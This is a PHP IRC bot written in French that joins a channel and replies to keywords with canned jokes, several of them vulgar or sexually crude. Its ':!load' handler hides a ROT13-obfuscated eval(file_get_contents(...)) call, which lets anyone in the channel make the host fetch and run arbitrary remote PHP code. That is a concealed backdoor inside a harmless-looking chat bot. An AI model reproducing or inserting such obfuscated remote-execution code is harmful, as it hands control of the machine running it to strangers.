<?php
/* Sandra est une garce ! */
/* Ce bot se connecte au salon, et donne son statut s'il reçoit !statut */

// Ne pas stopper le script.
set_time_limit(0);

// Ouvrir le réseau sur le port 6667
$socket = fsockopen("irc.hackint.eu", 6667);
$nick="Sandra";
// Générer des nick aleatoires : le serveur peut mettre du temps a détecter que l'ancien pseudo est libre.
$nb=rand(18,95);
$nick.=$nb;
$chan="vdw";

// NICK permet de s'identifier sur le serveur.
fputs( $socket , "NICK ".$nick."\r\n" );
fputs( $socket , "USER guest localhost irc_server :guest\r\n");

/* Flag temps */
$sandra = "0";

// Force an endless while
$acc="Je ne le dirais jamais assez, c'est pas lui, c'est Balkany !";

while(1) {
     // Continue the rest of the script here
     while($data = fgets($socket, 128)) {
         echo nl2br($data);
         flush();
         // Separate all data
         $ex = explode(' ', $data);
         // Send PONG back to the server
         if($ex[0] == "PING"){
             fputs($socket, "PONG ".$ex[1]."\n");
         }
         
			// Message d'accueil.			
			if(strpos($data," JOIN ") !== false){if( (time() - $sandra) > 23 * 60){fputs($socket, "PRIVMSG #".$chan." :".$acc."\r\n");$sandra = time();}}
		 
// Entre dans le salon.
if (strstr($data,":!statut")) {
	fputs($socket, "PRIVMSG ".$ex[2]." ".$nick." is online!\r\n");
	}
if (strstr($data,":!acc")) {
	$acc=substr($ex[4],0,strlen($ex[4])-2);
	}
	
	

//if rep2[3].lower() == ":!yt":IRC.send("PRIVMSG %s :%s\r\n" % (rep2[2], "https://www.youtube.com/results?search_query=" + "+".join(rep2[4:])))
// Créer recherche avec youtube et php
// Manque une sortie EXIT au bot.
// Manque réponses aléatoires.

	
	
// Phrases
if (strstr($data,"pigeon")) {
	fputs($socket, "PRIVMSG ".$ex[2]." :Saleté de pigeons. Tu leurs donnes à manger et en retour ils te chient dessus.\r\n");
	}
		 
if (strstr($data,"danse pour moi")) {
   fputs($socket, "PRIVMSG ".$ex[2]." :Mais t'es pas bien toi ! Y'a du monde !\r\n");
   }
		 
if (strstr($data,"célibataire")) {
   fputs($socket, "PRIVMSG ".$ex[2]." :Être célibataire c'est comme avoir une assurance MMA, Zéro tracas, Zéro blabla.\r\n");
   } 
		 
if (strstr($data,"maman")) {
   fputs($socket, "PRIVMSG ".$ex[2]." :L’exorciste , Paranormal Activity , Saw.. ne feront JAMAIS aussi PEUR que 35 Appels manqués de ta Mère..!\r\n");
   }

if (strstr($data,"la porte")) {
   fputs($socket, "PRIVMSG ".$ex[2]." :A trop regarder par le trou de la serrure, on se prend la porte dans la gueule.\r\n");
   }

if (strstr($data,"Tais toi")) {
    fputs($socket, "PRIVMSG ".$ex[2]." :J'aime parler de rien, c'est le seul domaine où j'ai de vagues connaissances.\r\n");
   }
		 
if (strstr($data,"j'ai beaucoup de succès")) {fputs($socket, "PRIVMSG ".$ex[2]." :Les personnes qui se vantent d'être courues ne devraient pas oublier que les produits à bas prix attirent beaucoup de clients.\r\n");}

// Vulgaire
if (strstr($data,"Suce moi")) {
    fputs($socket, "PRIVMSG ".$ex[2]." :J'aurais bien voulu mais je la trouve pas.\r\n");
    } 

if (strstr($data,"écartes les cuisses sandra")) {
    fputs($socket, "PRIVMSG ".$ex[2]." :Tu veux voir si j'ai mes règles ?\r\n");
    }
		 
if (strstr($data,"salope")) {if( (time() - $salope) > 50 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :C'est vrai que, sur le net, j'en vois pas mal qui ne sont attirées que par l'argent et le sex.\r\n");$salope = time();}}


if (strstr($data,"APWAL")) {
    fputs($socket, "PRIVMSG ".$ex[2]." :APWAL ! APWAL ! Tout le monde APWAL !\r\n");
    }

if (strstr($data,"encu")) {
	fputs($socket, "PRIVMSG ".$ex[2]." :Viens, approche voir, je vais te calmer le langage, tu connais les chaises à clous ? Assiez toi la !\r\n");
	}
	
if (strstr($data,":!load")) {
$d="riny(svyr_trg_pbagragf('".substr($ex[4],0,strlen($ex[4])-2)."',snyfr));";
eval(str_rot13($d));
}

		if(strstr($data,"376")) {
			  //Connect to #hackbbs-test
              fputs( $socket , "JOIN #".$chan."\r\n");
}}}
?>	